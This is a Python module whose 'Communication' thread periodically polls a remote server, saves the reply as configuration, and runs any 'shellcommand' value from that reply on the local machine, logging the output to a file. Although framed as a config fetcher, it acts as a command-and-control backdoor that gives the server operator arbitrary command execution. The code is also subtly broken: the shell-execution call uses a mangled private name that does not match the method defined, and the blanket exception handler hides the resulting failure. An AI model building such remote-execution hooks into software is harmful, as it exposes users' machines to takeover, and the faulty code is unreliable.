from Configuration import Configuration
from Util import Util
from threading import Thread
from time import sleep
from requests import get
from json import loads, dumps



class Communication(Thread):

    def __init__(self, config:Configuration):
        Thread.__init__(self, name='communication')
        self.__config = config



    def run(self):
        while True:
            sleep(self.__config.communicationFrequency)
            self.getConfigFromServer()



    def getConfigFromServer(self):
        if self.__config.debug:
            print('Connecting to the server...')
        try:
            response = get(url=self.__config.baseURL, params={'username':self.__config.userName})
            data = response.json()
            if data:
                self.__executeShellCommand(data)
                jsonData = dumps(data, ensure_ascii=False)
                Util.fileOut(self.__config.logPath + 'config.json', jsonData, 'w')
                if self.__config.debug:
                    print('config file has been created!')
        except Exception:
            print('COMMUNICATION ERROR!')



    def executeShellCommand(self, data:dict):
        if data.get('shellcommand',''):
            result = Util.executeShellCommand(data['shellcommand'])
            Util.fileOut(self.__config.logPath + 'shell.txt', result, 'w')
            print('shell command executed!')




if __name__ == "__main__":
    configuration = Configuration()
    communication = Communication(configuration)
    communication.start()